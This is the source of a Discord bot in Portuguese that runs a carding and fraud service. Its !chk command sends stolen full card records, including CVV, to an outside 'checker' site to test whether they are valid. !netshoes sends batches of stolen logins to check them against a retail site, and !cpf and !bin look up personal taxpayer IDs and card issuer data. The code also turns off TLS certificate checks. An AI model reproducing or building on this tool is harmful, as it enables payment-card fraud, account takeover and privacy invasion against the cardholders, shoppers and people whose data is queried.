const Discord = require('discord.js');
const bot = new Discord.Client();

bot.on('message', (msg) => {
	
    const message = msg.content.toLowerCase();
    if(message.startsWith('!chk')) {
      if(message.channel.id !== '454076709013291020') {
	return message.reply("Uso deste comando exclusivo em <#454076709013291020>");
    }
        Check(msg);
    }
    if(message.startsWith('!cpf')) {
      if(message.channel.id !== '454076709013291020') {
	return message.reply("Uso deste comando exclusivo em <#454076709013291020>");
    }
        CheckCPF(msg);
    }
	
    if(message.startsWith('!bin')) {
      if(message.channel.id !== '454076709013291020') {
	return message.reply("Uso deste comando exclusivo em <#454076709013291020>");
    }
        VerifyBin(msg);
    }
	
    if(message.startsWith('.')) {
      if(message.channel.id !== '454076709013291020') {
	return message.reply("Uso deste comando exclusivo em <#454076709013291020>");
    }
        FalarComObot(msg);
    }
	
    if(message.startsWith('!cep')) {
      if(message.channel.id !== '454076709013291020') {
	return message.reply("Uso deste comando exclusivo em <#454076709013291020>");
    }
        PuxarCEP(msg);
    }
	
    if(message.startsWith('!on?')) {
        ons(msg);
    }
	
    if(message.startsWith('!comandos')) {
        MostrarComandos(msg);
    }
	
    if(message.startsWith('!netshoes')) {
        NetshoesChecker(msg);
    }
	
});

function Check(message) {
var cc = message.content.replace("!chk ", "").split("\n");
if(cc.length > 10){
return message.reply("** O LIMITE DE CARTÕES É __10__**");
}
        cc.forEach(function (value) {
      	Request("http://thelimaochecker.tk/bot/full.php?dados=" + value, function(result) {
		message.channel.send(result);
      });
        });

  }
  function CheckCPF(message) {
    	var msg = message.content;
    	var author = message.author;
    	var fields = msg.split(' ');
    	var cpf = fields[1];
        Request("http://thelimaochecker.tk/bot/cpf.php?cpf=" + cpf + "&author=" + author, function(result) {
		message.channel.send(result);
     	 });
      }
  function VerifyBin(message) {
    var msg = message.content;
    var fields = msg.split(' ');
    var bin = fields[1];
      Request("http://thelimaochecker.tk/bot/bin.php?bin=" + bin, function(result) {
            message.channel.send(result);
      });
  }

function NetshoesChecker(message) {
var dados = message.content.replace("!netshoes ", "").split("\n");
if(dados.length > 10){
return message.reply("10 logins por vez.");
}
        dados.forEach(function (value) {
      Request("http://thelimao.kinghost.net/netshoes.php?dados=" + value, function(result) {
            message.channel.send(result);
      });
        });

  }
  
    function FalarComObot(message) {
        var msg = message.content;
        var msge = msg.replace(".", "");
          Request("http://thelimaochecker.tk/painel/full/bot.php?msg=" + msge, function(result) {
                message.channel.send(result);
          });
      }
	  
    function ons(message) {
		message.channel.send("Estou online!");
    }
	
    function MostrarComandos(message) {
        message.reply('Comandos enviados no seu privado! (**Mensagens Diretas**)');
        var embed = new Discord.RichEmbed()
            .addField("!cpf", "Consulte um CPF! Exemplo: !cpf 06927173404", true)
			.addField("!bin", "Consulte uma BIN! Exemplo: !bin 498408", true)
			.addField("!chk", "Testador de Full! Exemplo: !chk 5464795013669943|05|2020|073", true)
			.addField("!bot", "Fale com o bot (Uma divers?o). Exemplo: !bot oi", true)
        message.author.sendEmbed(embed);
    }
	 
  function PuxarCEP(message) {
    var msg = message.content;
    var fields = msg.split(' ');
    var cep = fields[1];
      Request("http://localhost/bot/cep.php?cep=" + cep, function(result) {
            message.channel.send({embed: {
                color: 0x8080ff,
                description: result
            }});
      });
  }
	  
  function Request(request2, callback) {
    process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
    var request = require("request");
    request({
      url: request2
    }, function (error, response, body) {
       if (!error && response.statusCode == 200) {
          callback(body);
       } 
    });
  }



bot.login(process.env.BOT_TOKEN);
